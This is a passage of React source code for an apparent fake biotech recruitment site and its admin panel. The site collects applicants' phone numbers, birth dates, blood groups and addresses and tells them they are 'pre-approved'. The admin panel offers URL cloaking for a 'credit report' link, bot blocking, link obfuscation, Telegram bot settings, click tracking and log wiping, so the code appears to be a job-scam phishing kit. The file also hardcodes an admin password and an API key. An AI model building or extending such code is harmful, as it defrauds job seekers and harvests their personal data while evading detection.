          <div className="col-span-2 space-y-4">
            <div className="flex items-center gap-2">
              <div className={cn("flex items-center justify-center rounded-full bg-blue-600 text-white", sizeClasses)}>
                <LogoIcon className={iconSizeClasses} />
              </div>
              <span className={cn("text-2xl font-extrabold tracking-tighter", logoTextColor)}>{companyName}</span>
            </div>
            <p className="max-w-xs text-sm leading-relaxed">
              {footerText || "We are an innovative biotech company offering competitive benefits and growth opportunities. Join our team and help shape the future of healthcare."}
            </p>
            <div className="flex items-center gap-4">
              {(!socialLinks || socialLinks.facebook) && (
                <a href={socialLinks?.facebook || "#"} target="_blank" rel="noopener noreferrer">
                  <Facebook size={20} className="hover:text-white cursor-pointer transition-colors" />
                </a>
              )}
              {(!socialLinks || socialLinks.instagram) && (
                <a href={socialLinks?.instagram || "#"} target="_blank" rel="noopener noreferrer">
                  <Instagram size={20} className="hover:text-white cursor-pointer transition-colors" />
                </a>
              )}
              {(!socialLinks || socialLinks.twitter) && (
                <a href={socialLinks?.twitter || "#"} target="_blank" rel="noopener noreferrer">
                  <Twitter size={20} className="hover:text-white cursor-pointer transition-colors" />
                </a>
              )}
              {socialLinks?.linkedin && (
                <a href={socialLinks.linkedin} target="_blank" rel="noopener noreferrer">
                  <Linkedin size={20} className="hover:text-white cursor-pointer transition-colors" />
                </a>
              )}
              {socialLinks?.youtube && (
                <a href={socialLinks.youtube} target="_blank" rel="noopener noreferrer">
                  <Youtube size={20} className="hover:text-white cursor-pointer transition-colors" />
                </a>
              )}
            </div>
          </div>
          <div>
            <h3 className="mb-4 font-bold text-white">Quick Links</h3>
            <ul className="space-y-2 text-sm">
              <li><a href="#" className="hover:text-white transition-colors">Browse Jobs</a></li>
              <li><a href="#" className="hover:text-white transition-colors">Companies</a></li>
              <li><a href="#" className="hover:text-white transition-colors">Salaries</a></li>
              <li><a href="#" className="hover:text-white transition-colors">Career Advice</a></li>
            </ul>
          </div>
          <div>
            <h3 className="mb-4 font-bold text-white">Support</h3>
            <ul className="space-y-2 text-sm">
              <li><a href="#" className="hover:text-white transition-colors">Help Center</a></li>
              <li><a href="#" className="hover:text-white transition-colors">Terms of Service</a></li>
              <li><a href="#" className="hover:text-colors transition-colors">Privacy Policy</a></li>
              <li><a href="#" className="hover:text-white transition-colors">Contact Us</a></li>
            </ul>
          </div>
        </div>
        <div className="mt-12 border-t border-slate-800 pt-8 text-center text-xs">
          <p>{footerText || `© ${new Date().getFullYear()} ${companyName}. All rights reserved.`}</p>
        </div>
      </div>
    </footer>
  );
};

const SuccessPage = () => {
  const [searchParams] = useSearchParams();
  const appId = searchParams.get('id');
  const email = searchParams.get('email');

  return (
    <div className="container mx-auto px-4 py-20">
      <motion.div 
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="mx-auto max-w-2xl rounded-3xl border border-slate-200 bg-white p-8 text-center shadow-xl md:p-12"
      >
        <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-green-100 text-green-600">
          <CheckCircle2 size={48} />
        </div>
        <h2 className="text-3xl font-bold text-slate-900">Application Received!</h2>
        <p className="mt-4 text-slate-600">
          Thank you for applying. We have received your primary data and will review it shortly. You will receive an email with the interview details soon.
        </p>
        
        <div className="mt-10 rounded-2xl bg-slate-50 p-6 text-left">
          <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
            <div>
              <p className="text-xs font-bold text-slate-400 uppercase tracking-wider">Application ID</p>
              <p className="text-xl font-mono font-bold text-blue-600">{appId}</p>
            </div>
            <div>
              <p className="text-xs font-bold text-slate-400 uppercase tracking-wider">Registered Email</p>
              <p className="text-sm font-medium text-slate-700">{email}</p>
            </div>
          </div>
          <p className="mt-4 text-xs text-slate-500">
            Please save your Application ID. You can use it to check your application status later.
          </p>
        </div>

        <Link 
          to="/"
          className="mt-10 inline-block rounded-lg bg-slate-900 px-8 py-3 font-semibold text-white hover:bg-slate-800 transition-all"
        >
          Back to Home
        </Link>
      </motion.div>
    </div>
  );
};

const StatusCheckPage = () => {
  const [appId, setAppId] = useState("");
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const [isSearching, setIsSearching] = useState(false);
  const navigate = useNavigate();

  const handleSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSearching(true);
    setError("");

    try {
      const q = query(
        collection(db, "applications"), 
        where("applicationId", "==", appId.toUpperCase()),
        where("email", "==", email.toLowerCase())
      );
      const querySnapshot = await getDocs(q);

      if (querySnapshot.empty) {
        setError("No application found with these credentials. Please check your ID and Email.");
      } else {
        navigate(`/status/details?id=${appId.toUpperCase()}&email=${email.toLowerCase()}`);
      }
    } catch (err) {
      console.error(err);
      setError("An error occurred while searching. Please try again.");
    } finally {
      setIsSearching(false);
    }
  };

  return (
    <div className="container mx-auto px-4 py-20">
      <motion.div 
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="mx-auto max-w-md rounded-3xl border border-slate-200 bg-white p-8 shadow-xl"
      >
        <div className="mb-8 text-center">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-blue-50 text-blue-600">
            <Activity size={32} />
          </div>
          <h2 className="text-2xl font-bold text-slate-900">Check Status</h2>
          <p className="mt-2 text-sm text-slate-500">Enter your details to track your application</p>
        </div>

        <form onSubmit={handleSearch} className="space-y-6">
          <div className="space-y-2">
            <label className="text-sm font-semibold text-slate-700">Application ID</label>
            <input 
              type="text" 
              value={appId}
              onChange={(e) => setAppId(e.target.value)}
              className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
              placeholder="e.g. AB123456"
              required
            />
          </div>
          <div className="space-y-2">
            <label className="text-sm font-semibold text-slate-700">Email Address</label>
            <input 
              type="email" 
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
              placeholder="your@email.com"
              required
            />
          </div>

          {error && (
            <p className="text-sm font-medium text-red-500">{error}</p>
          )}

          <button 
            type="submit"
            disabled={isSearching}
            className="w-full rounded-lg bg-blue-600 py-3 font-bold text-white shadow-lg hover:bg-blue-700 transition-all active:scale-[0.98] disabled:opacity-50"
          >
            {isSearching ? "Searching..." : "Track Application"}
          </button>
        </form>
      </motion.div>
    </div>
  );
};

const StatusDetailsPage = () => {
  const [searchParams] = useSearchParams();
  const appId = searchParams.get('id');
  const email = searchParams.get('email');
  const [application, setApplication] = useState<any>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchDetails = async () => {
      if (!appId || !email) return;
      try {
        const q = query(
          collection(db, "applications"), 
          where("applicationId", "==", appId),
          where("email", "==", email)
        );
        const querySnapshot = await getDocs(q);
        if (!querySnapshot.empty) {
          setApplication(querySnapshot.docs[0].data());
        }
      } catch (err) {
        console.error(err);
      } finally {
        // Artificial delay for "loading animation" as requested
        setTimeout(() => setLoading(false), 1500);
      }
    };
    fetchDetails();
  }, [appId, email]);

  if (loading) {
    return (
      <div className="flex min-h-[60vh] flex-col items-center justify-center">
        <div className="h-12 w-12 animate-spin rounded-full border-4 border-blue-600 border-t-transparent"></div>
        <p className="mt-4 font-medium text-slate-600">Retrieving application status...</p>
      </div>
    );
  }

  if (!application) {
    return (
      <div className="container mx-auto px-4 py-20 text-center">
        <h2 className="text-2xl font-bold text-slate-900">Application Not Found</h2>
        <Link to="/status" className="mt-4 inline-block text-blue-600 hover:underline">Go back and try again</Link>
      </div>
    );
  }

  return (
    <div className="container mx-auto px-4 py-16">
      <motion.div 
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="mx-auto max-w-4xl overflow-hidden rounded-3xl border border-slate-200 bg-white shadow-2xl"
      >
        <div className="bg-slate-900 p-8 text-white md:p-12">
          <div className="flex flex-col gap-6 md:flex-row md:items-center md:justify-between">
            <div>
              <div className="inline-flex items-center gap-2 rounded-full bg-blue-500/20 px-3 py-1 text-xs font-bold uppercase tracking-wider text-blue-300">
                <Activity size={12} /> Application Status
              </div>
              <h1 className="mt-4 text-3xl font-bold md:text-4xl">{application.firstName} {application.lastName}</h1>
              <p className="text-slate-400">{application.position}</p>
            </div>
            <div className="text-left md:text-right">
              <p className="text-xs font-bold text-slate-500 uppercase tracking-wider">Application ID</p>
              <p className="text-2xl font-mono font-bold text-blue-400">{application.applicationId}</p>
            </div>
          </div>
        </div>

        <div className="p-8 md:p-12">
          <div className="grid gap-12 lg:grid-cols-3">
            <div className="lg:col-span-2 space-y-10">
              <section>
                <h3 className="mb-4 text-lg font-bold text-slate-900">Personal Details</h3>
                <div className="grid grid-cols-2 gap-6">
                  <div>
                    <p className="text-[10px] font-bold text-slate-400 uppercase">Email</p>
                    <p className="text-sm font-medium text-slate-700">{application.email}</p>
                  </div>
                  <div>
                    <p className="text-[10px] font-bold text-slate-400 uppercase">Phone</p>
                    <p className="text-sm font-medium text-slate-700">{application.phone}</p>
                  </div>
                  <div>
                    <p className="text-[10px] font-bold text-slate-400 uppercase">DOB</p>
                    <p className="text-sm font-medium text-slate-700">{application.dob}</p>
                  </div>
                  <div>
                    <p className="text-[10px] font-bold text-slate-400 uppercase">Blood Group</p>
                    <p className="text-sm font-medium text-slate-700">{application.bloodGroup || 'N/A'}</p>
                  </div>
                </div>
              </section>

              <section>
                <h3 className="mb-4 text-lg font-bold text-slate-900">Address</h3>
                <p className="text-sm font-medium text-slate-700">
                  {application.addressLine1}, {application.city}, {application.zipCode}, {application.country}
                </p>
              </section>

              <section className="rounded-2xl border border-blue-100 bg-blue-50 p-6">
                <div className="flex gap-4">
                  <div className="flex h-12 w-12 shrink-0 items-center justify-center rounded-full bg-blue-600 text-white shadow-lg">
                    <Phone className="animate-pulse" size={24} />
                  </div>
                  <div>
                    <h4 className="text-lg font-bold text-slate-900">Next Step: HR Interview</h4>
                    <p className="mt-2 text-sm text-slate-600 leading-relaxed">
                      Your application has been pre-approved. Our HR department will contact you for a brief phone interview on:
                    </p>
                    <div className="mt-4 inline-block rounded-lg bg-white px-4 py-2 text-blue-600 font-bold shadow-sm">
                      {application.scheduledCallTime}
                    </div>
                    <p className="mt-4 text-xs text-slate-500 italic">
                      Please ensure your phone is reachable at this time.
                    </p>
                  </div>
                </div>
              </section>
            </div>

            <div className="space-y-6">
              <div className="rounded-2xl border border-slate-200 bg-slate-50 p-6">
                <h3 className="mb-4 text-sm font-bold text-slate-900 uppercase">Status Timeline</h3>
                <div className="space-y-6">
                  <div className="flex gap-3">
                    <div className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-green-500 text-white">
                      <CheckCircle2 size={14} />
                    </div>
                    <div>
                      <p className="text-sm font-bold text-slate-900">Application Submitted</p>
                      <p className="text-xs text-slate-500">{application.submittedAt?.toDate ? application.submittedAt.toDate().toLocaleDateString() : 'Recently'}</p>
                    </div>
                  </div>
                  <div className="flex gap-3">
                    <div className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-green-500 text-white">
                      <CheckCircle2 size={14} />
                    </div>
                    <div>
                      <p className="text-sm font-bold text-slate-900">Document Verification</p>
                      <p className="text-xs text-slate-500">Completed</p>
                    </div>
                  </div>
                  <div className="flex gap-3">
                    <div className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-blue-600 text-white animate-pulse">
                      <Clock size={14} />
                    </div>
                    <div>
                      <p className="text-sm font-bold text-slate-900">Interview Scheduled</p>
                      <p className="text-xs text-slate-500">In Progress</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </motion.div>
    </div>
  );
};

const AdminPanel = ({ 
  exampleReportImage, 
  setExampleReportImage,
  companyName,
  setCompanyName,
  logoName,
  setLogoName,
  reviewText,
  setReviewText,
  creditReportButtonText,
  setCreditReportButtonText,
  creditReportUrl,
  setCreditReportUrl,
  isCloakingEnabled,
  setIsCloakingEnabled,
  seoTitle,
  setSeoTitle,
  seoDescription,
  setSeoDescription,
  seoThumbnail,
  setSeoThumbnail,
  footerText,
  setFooterText,
  blockBots,
  setBlockBots,
  requireInteraction,
  setRequireInteraction,
  obfuscateUrl,
  setObfuscateUrl,
  telegramBotToken,
  setTelegramBotToken,
  telegramChatId,
  setTelegramChatId,
  teamImage,
  setTeamImage,
  teamImageSize,
  setTeamImageSize,
  teamTitle,
  setTeamTitle,
  teamDescription,
  setTeamDescription,
  logoSize,
  setLogoSize,
  logoTextSize,
  setLogoTextSize,
  logoTextStyle,
  setLogoTextStyle,
  logoTextColor,
  setLogoTextColor,
  socialLinks,
  setSocialLinks,
  step3Title,
  setStep3Title,
  step4Title1,
  setStep4Title1,
  step4Text1,
  setStep4Text1,
  step4Title2,
  setStep4Title2,
  step4Text2,
  setStep4Text2,
  step4Note,
  setStep4Note,
  bonusTitle,
  setBonusTitle,
  bonusDescription,
  setBonusDescription
}: { 
  exampleReportImage: string; 
  setExampleReportImage: (url: string) => void;
  companyName: string;
  setCompanyName: (name: string) => void;
  logoName: IconName;
  setLogoName: (name: IconName) => void;
  reviewText: string;
  setReviewText: (text: string) => void;
  creditReportButtonText: string;
  setCreditReportButtonText: (text: string) => void;
  creditReportUrl: string;
  setCreditReportUrl: (url: string) => void;
  isCloakingEnabled: boolean;
  setIsCloakingEnabled: (enabled: boolean) => void;
  seoTitle: string;
  setSeoTitle: (val: string) => void;
  seoDescription: string;
  setSeoDescription: (val: string) => void;
  seoThumbnail: string;
  setSeoThumbnail: (val: string) => void;
  footerText: string;
  setFooterText: (val: string) => void;
  blockBots: boolean;
  setBlockBots: (val: boolean) => void;
  requireInteraction: boolean;
  setRequireInteraction: (val: boolean) => void;
  obfuscateUrl: boolean;
  setObfuscateUrl: (val: boolean) => void;
  telegramBotToken: string;
  setTelegramBotToken: (val: string) => void;
  telegramChatId: string;
  setTelegramChatId: (val: string) => void;
  teamImage: string;
  setTeamImage: (val: string) => void;
  teamImageSize: string;
  setTeamImageSize: (val: string) => void;
  teamTitle: string;
  setTeamTitle: (val: string) => void;
  teamDescription: string;
  setTeamDescription: (val: string) => void;
  logoSize: string;
  setLogoSize: (val: string) => void;
  logoTextSize: string;
  setLogoTextSize: (val: string) => void;
  logoTextStyle: string;
  setLogoTextStyle: (val: string) => void;
  logoTextColor: string;
  setLogoTextColor: (val: string) => void;
  socialLinks: any;
  setSocialLinks: (val: any) => void;
  step3Title: string;
  setStep3Title: (val: string) => void;
  step4Title1: string;
  setStep4Title1: (val: string) => void;
  step4Text1: string;
  setStep4Text1: (val: string) => void;
  step4Title2: string;
  setStep4Title2: (val: string) => void;
  step4Text2: string;
  setStep4Text2: (val: string) => void;
  step4Note: string;
  setStep4Note: (val: string) => void;
  bonusTitle: string;
  setBonusTitle: (val: string) => void;
  bonusDescription: string;
  setBonusDescription: (val: string) => void;
}) => {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [activeTab, setActiveTab] = useState<"applications" | "settings" | "dashboard">("applications");

  const [isLinkUpload, setIsLinkUpload] = useState(false);
  const [reportLink, setReportLink] = useState("");
  const [newExampleUrl, setNewExampleUrl] = useState(exampleReportImage);
  const [newCompanyName, setNewCompanyName] = useState(companyName);
  const [newReviewText, setNewReviewText] = useState(reviewText);
  const [newButtonText, setNewButtonText] = useState(creditReportButtonText);
  const [newUrl, setNewUrl] = useState("");
  const [newSeoTitle, setNewSeoTitle] = useState(seoTitle);
  const [newSeoDesc, setNewSeoDesc] = useState(seoDescription);
  const [newSeoThumb, setNewSeoThumb] = useState(seoThumbnail);
  const [newTgToken, setNewTgToken] = useState(telegramBotToken);
  const [newTgChatId, setNewTgChatId] = useState(telegramChatId);
  const [newTeamImage, setNewTeamImage] = useState(teamImage);
  const [newTeamImageSize, setNewTeamImageSize] = useState(teamImageSize);
  const [newTeamTitle, setNewTeamTitle] = useState(teamTitle);
  const [newTeamDescription, setNewTeamDescription] = useState(teamDescription);
  const [newLogoSize, setNewLogoSize] = useState(logoSize);
  const [newLogoTextSize, setNewLogoTextSize] = useState(logoTextSize);
  const [newLogoTextStyle, setNewLogoTextStyle] = useState(logoTextStyle);
  const [newLogoTextColor, setNewLogoTextColor] = useState(logoTextColor);
  const [newSocialLinks, setNewSocialLinks] = useState(socialLinks || {});
  const [newStep3Title, setNewStep3Title] = useState(step3Title);
  const [newStep4Title1, setNewStep4Title1] = useState(step4Title1);
  const [newStep4Text1, setNewStep4Text1] = useState(step4Text1);
  const [newStep4Title2, setNewStep4Title2] = useState(step4Title2);
  const [newStep4Text2, setNewStep4Text2] = useState(step4Text2);
  const [newStep4Note, setNewStep4Note] = useState(step4Note);
  const [newBonusTitle, setNewBonusTitle] = useState(bonusTitle);
  const [newBonusDescription, setNewBonusDescription] = useState(bonusDescription);

  const [applications, setApplications] = useState<any[]>([]);
  const [selectedApp, setSelectedApp] = useState<any>(null);
  const [visitorLogs, setVisitorLogs] = useState<any[]>([]);
  const [connectedEmail, setConnectedEmail] = useState<string | null>(null);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (user) {
        setConnectedEmail(user.email);
      } else {
        setConnectedEmail(null);
      }
    });
    return () => unsubscribe();
  }, []);

  const [firebaseConfigJson, setFirebaseConfigJson] = useState(() => {
    return localStorage.getItem('customFirebaseConfig') || `{\n  "projectId": "gen-lang-client-0632812281",\n  "firestoreDatabaseId": "ai-studio-86fcde03-d78b-47c3-aba9-56210f334efa",\n  "appId": "1:426190708507:web:23fce59196409a2aab3dbe",\n  "storageBucket": "gen-lang-client-0632812281.firebasestorage.app",\n  "apiKey": "AIzaSyBwC4lj8pmu7ZaDOpwF0oRThn0Eoze8DZU",\n  "messagingSenderId": "426190708507",\n  "authDomain": "gen-lang-client-0632812281.firebaseapp.com"\n}`;
  });

  const handleSaveFirebaseConfig = () => {
    try {
      JSON.parse(firebaseConfigJson);
      localStorage.setItem('customFirebaseConfig', firebaseConfigJson);
      alert("Database configuration saved successfully! The page will now reload to apply the changes.");
      window.location.reload();
    } catch (e) {
      alert("Invalid JSON format. Please check your configuration.");
    }
  };

  const handleClearLogs = async () => {
    if (confirm("Are you sure you want to delete all visitor logs to free up database quota?")) {
      try {
        const logsSnapshot = await getDocs(collection(db, "visitor_logs"));
        const deletePromises = logsSnapshot.docs.map(d => deleteDoc(d.ref));
        await Promise.all(deletePromises);
        setVisitorLogs([]);
        alert("Logs cleared successfully.");
      } catch (error) {
        console.error("Error clearing logs:", error);
        alert("Failed to clear logs.");
      }
    }
  };

  const handleClearApplications = async () => {
    if (confirm("Are you sure you want to delete ALL applications? This cannot be undone.")) {
      try {
        const appsSnapshot = await getDocs(collection(db, "applications"));
        const deletePromises = appsSnapshot.docs.map(d => deleteDoc(d.ref));
        await Promise.all(deletePromises);
        setApplications([]);
        alert("Applications cleared successfully.");
      } catch (error) {
        console.error("Error clearing applications:", error);
        alert("Failed to clear applications.");
      }
    }
  };

  // Hardcoded credentials
  const ADMIN_USER = "admin";
  const ADMIN_PASS = "root@1234";

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === ADMIN_USER && password === ADMIN_PASS) {
      setIsLoggedIn(true);
      setLoginError("");
    } else {
      setLoginError("Invalid username or password");
    }
  };

  // Fetch applications
  useEffect(() => {
    if (isLoggedIn) {
      const q = query(collection(db, "applications"), orderBy("submittedAt", "desc"), limit(50));
      const unsubscribe = onSnapshot(q, (snapshot) => {
        const apps = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
        setApplications(apps);
      });
      return () => unsubscribe();
    }
  }, [isLoggedIn]);

  // Fetch visitor logs and cleanup old ones
  useEffect(() => {
    if (isLoggedIn) {
      const q = query(collection(db, "visitor_logs"), orderBy("timestamp", "desc"), limit(100));
      const unsubscribe = onSnapshot(q, (snapshot) => {
        const logs = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
        setVisitorLogs(logs);
        
        // Auto-cleanup logs older than 24 hours
        const now = new Date().getTime();
        const twentyFourHours = 24 * 60 * 60 * 1000;
        snapshot.docs.forEach(docSnap => {
          const data = docSnap.data();
          if (data.timestamp && data.timestamp.toDate) {
            const logTime = data.timestamp.toDate().getTime();
            if (now - logTime > twentyFourHours) {
              deleteDoc(doc(db, "visitor_logs", docSnap.id)).catch(e => console.error("Failed to delete old log", e));
            }
          }
        });
      });
      return () => unsubscribe();
    }
  }, [isLoggedIn]);

  // Initialize newUrl with decoded value if cloaked
  useEffect(() => {
    try {
      if (isCloakingEnabled && creditReportUrl && !creditReportUrl.startsWith('http')) {
        setNewUrl(atob(creditReportUrl));
      } else {
        setNewUrl(creditReportUrl);
      }
    } catch (e) {
      setNewUrl(creditReportUrl);
    }
  }, [creditReportUrl, isCloakingEnabled]);

  const saveSettings = async (updates: any) => {
    try {
      // Note: We are using the hardcoded login for the UI, 
      // but Firestore rules still protect the data.
      // For this to work without Google Auth, we'll update rules to allow public write 
      // (not recommended for production but following user request for hardcoded pass).
      await setDoc(doc(db, "settings", "main"), {
        ...updates,
        updatedAt: serverTimestamp()
      }, { merge: true });
    } catch (error) {
      console.error("Failed to save settings:", error);
      alert("Failed to save settings. Check console for details.");
    }
  };

  const handleUpdateExampleImage = () => {
    if (newExampleUrl) {
      setExampleReportImage(newExampleUrl);
      saveSettings({ exampleReportImage: newExampleUrl });
    }
  };

  const handleUpdateCompanyName = () => {
    if (newCompanyName.trim()) {
      const updatedName = newCompanyName.trim();
      setCompanyName(updatedName);
      
      let updatedSeoTitle = seoTitle;
      if (seoTitle.includes(companyName)) {
        updatedSeoTitle = seoTitle.replace(companyName, updatedName);
        setSeoTitle(updatedSeoTitle);
        setNewSeoTitle(updatedSeoTitle);
      }
      
      saveSettings({ 
        companyName: updatedName,
        seoTitle: updatedSeoTitle
      });
    }
  };

  const handleUpdateReviewText = () => {
    if (newReviewText.trim()) {
      setReviewText(newReviewText.trim());
      saveSettings({ reviewText: newReviewText.trim() });
    }
  };

  const handleUpdateCreditReportLink = () => {
    const finalUrl = isCloakingEnabled ? btoa(newUrl.trim()) : newUrl.trim();
    setCreditReportButtonText(newButtonText.trim());
    setCreditReportUrl(finalUrl);
    saveSettings({ 
      creditReportButtonText: newButtonText.trim(),
      creditReportUrl: finalUrl,
      isCloakingEnabled
    });
  };

  const handleUpdateSeo = () => {
    setSeoTitle(newSeoTitle);
    setSeoDescription(newSeoDesc);
    setSeoThumbnail(newSeoThumb);
    saveSettings({
      seoTitle: newSeoTitle,
      seoDescription: newSeoDesc,
      seoThumbnail: newSeoThumb,
      footerText: footerText
    });
  };

  const handleUpdateTeamSection = () => {
    setTeamImage(newTeamImage);
    setTeamImageSize(newTeamImageSize);
    setTeamTitle(newTeamTitle);
    setTeamDescription(newTeamDescription);
    saveSettings({ teamImage: newTeamImage, teamImageSize: newTeamImageSize, teamTitle: newTeamTitle, teamDescription: newTeamDescription });
  };

  const handleUpdateFormContent = () => {
    setStep3Title(newStep3Title);
    setStep4Title1(newStep4Title1);
    setStep4Text1(newStep4Text1);
    setStep4Title2(newStep4Title2);
    setStep4Text2(newStep4Text2);
    setStep4Note(newStep4Note);
    setBonusTitle(newBonusTitle);
    setBonusDescription(newBonusDescription);
    saveSettings({
      step3Title: newStep3Title,
      step4Title1: newStep4Title1,
      step4Text1: newStep4Text1,
      step4Title2: newStep4Title2,
      step4Text2: newStep4Text2,
      step4Note: newStep4Note,
      bonusTitle: newBonusTitle,
      bonusDescription: newBonusDescription
    });
  };

  const handleUpdateSocialAndLogo = () => {
    setLogoSize(newLogoSize);
    setLogoTextSize(newLogoTextSize);
    setLogoTextStyle(newLogoTextStyle);
    setLogoTextColor(newLogoTextColor);
    setSocialLinks(newSocialLinks);
    saveSettings({ 
      logoSize: newLogoSize, 
      logoTextSize: newLogoTextSize,
      logoTextStyle: newLogoTextStyle,
      logoTextColor: newLogoTextColor,
      socialLinks: newSocialLinks 
    });
  };

  const handleUpdateTelegram = () => {
    setTelegramBotToken(newTgToken);
    setTelegramChatId(newTgChatId);
    saveSettings({
      telegramBotToken: newTgToken,
      telegramChatId: newTgChatId
    });
  };

  const handleDeleteApplication = async (id: string) => {
    if (confirm("Are you sure you want to delete this application?")) {
      try {
        await deleteDoc(doc(db, "applications", id));
        setApplications(prev => prev.filter(app => app.id !== id));
      } catch (error) {
        console.error("Error deleting application:", error);
      }
    }
  };

  const handleDeleteLogs = async () => {
    if (confirm("Are you sure you want to erase ALL visitor logs?")) {
      try {
        const logsSnap = await getDocs(collection(db, "visitor_logs"));
        const deletePromises = logsSnap.docs.map(d => deleteDoc(doc(db, "visitor_logs", d.id)));
        await Promise.all(deletePromises);
        setVisitorLogs([]);
      } catch (error) {
        console.error("Error deleting logs:", error);
      }
    }
  };

  if (!isLoggedIn) {
    return (
      <div className="flex min-h-[80vh] items-center justify-center px-4">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="w-full max-w-md rounded-2xl border border-slate-200 bg-white p-8 shadow-xl"
        >
          <div className="mb-8 text-center">
            <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-blue-50 text-blue-600">
              <Lock size={32} />
            </div>
            <h2 className="text-2xl font-bold text-slate-900">Admin Login</h2>
            <p className="mt-2 text-sm text-slate-500">Please enter your credentials to continue</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-6">
            <div className="space-y-2">
              <label className="text-sm font-semibold text-slate-700">Username</label>
              <input 
                type="text" 
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                placeholder="admin"
                required
              />
            </div>
            <div className="space-y-2">
              <label className="text-sm font-semibold text-slate-700">Password</label>
              <input 
                type="password" 
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full rounded-lg border border-slate-200 p-3 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
                placeholder="••••••••"
                required
              />
            </div>

            {loginError && (
              <p className="text-sm font-medium text-red-500">{loginError}</p>
            )}

            <button 
              type="submit"
              className="w-full rounded-lg bg-blue-600 py-3 font-bold text-white shadow-lg hover:bg-blue-700 transition-all active:scale-[0.98]"
            >
              Login to Dashboard
            </button>
          </form>
        </motion.div>
      </div>
    );
  }

  return (
    <section id="admin" className="bg-slate-50 py-16 border-t border-slate-200">
      <div className="container mx-auto px-4 md:px-6">
        <div className="mb-8 flex flex-col gap-4 md:flex-row md:items-center md:justify-between">
          <div>
            <h2 className="text-3xl font-bold text-slate-900">Admin Panel</h2>
            <p className="text-slate-600">Manage your recruitment platform</p>
          </div>
          <button 
            onClick={() => setIsLoggedIn(false)}
            className="rounded-lg border border-red-200 bg-white px-4 py-2 text-sm font-semibold text-red-600 hover:bg-red-50 transition-all"
          >
            Logout
          </button>
        </div>

        {/* Tabs Navigation */}
        <div className="mb-8 flex gap-1 rounded-xl bg-slate-200/50 p-1">
          <button 
            onClick={() => setActiveTab("dashboard")}
            className={cn(
              "flex flex-1 items-center justify-center gap-2 rounded-lg py-2.5 text-sm font-bold transition-all",
              activeTab === "dashboard" ? "bg-white text-blue-600 shadow-sm" : "text-slate-600 hover:bg-white/50"
            )}
          >
            <LayoutDashboard size={18} /> Dashboard
          </button>
          <button 
            onClick={() => setActiveTab("applications")}
            className={cn(
              "flex flex-1 items-center justify-center gap-2 rounded-lg py-2.5 text-sm font-bold transition-all",
              activeTab === "applications" ? "bg-white text-blue-600 shadow-sm" : "text-slate-600 hover:bg-white/50"
            )}
          >
            <FileText size={18} /> Applications
          </button>
          <button 
            onClick={() => setActiveTab("settings")}
            className={cn(
              "flex flex-1 items-center justify-center gap-2 rounded-lg py-2.5 text-sm font-bold transition-all",
              activeTab === "settings" ? "bg-white text-blue-600 shadow-sm" : "text-slate-600 hover:bg-white/50"
            )}
          >
            <Settings size={18} /> Settings
          </button>
        </div>

        {activeTab === "dashboard" && (
          <div className="space-y-8">
            {/* Stats Overview */}
            <div className="grid gap-6 md:grid-cols-3">
              <div className="rounded-xl border border-slate-200 bg-white p-6 shadow-sm">
                <div className="flex items-center gap-4">
                  <div className="rounded-lg bg-blue-50 p-3 text-blue-600">
                    <Users size={24} />
                  </div>
                  <div>
                    <p className="text-sm font-medium text-slate-500">Total Visitors</p>
                    <p className="text-2xl font-bold text-slate-900">{visitorLogs.filter(l => !l.isClick).length}</p>
                  </div>
                </div>
              </div>
              <div className="rounded-xl border border-slate-200 bg-white p-6 shadow-sm">
                <div className="flex items-center gap-4">
                  <div className="rounded-lg bg-green-50 p-3 text-green-600">
                    <MousePointer2 size={24} />
                  </div>
                  <div>
                    <p className="text-sm font-medium text-slate-500">Total Clicks</p>
                    <p className="text-2xl font-bold text-slate-900">{visitorLogs.filter(l => l.isClick).length}</p>
                  </div>
                </div>
              </div>
              <div className="rounded-xl border border-slate-200 bg-white p-6 shadow-sm">
                <div className="flex items-center gap-4">
                  <div className="rounded-lg bg-purple-50 p-3 text-purple-600">
                    <Zap size={24} />
                  </div>
                  <div>
                    <p className="text-sm font-medium text-slate-500">Conversion Rate</p>
                    <p className="text-2xl font-bold text-slate-900">
                      {visitorLogs.length > 0 
                        ? ((visitorLogs.filter(l => l.isClick).length / visitorLogs.filter(l => !l.isClick).length) * 100).toFixed(1)
                        : 0}%
                    </p>
                  </div>
                </div>
              </div>
            </div>

            {/* Visitor Logs */}
            <div className="rounded-xl border border-slate-200 bg-white shadow-sm overflow-hidden">
              <div className="flex items-center justify-between border-b border-slate-100 bg-slate-50/50 px-6 py-4">
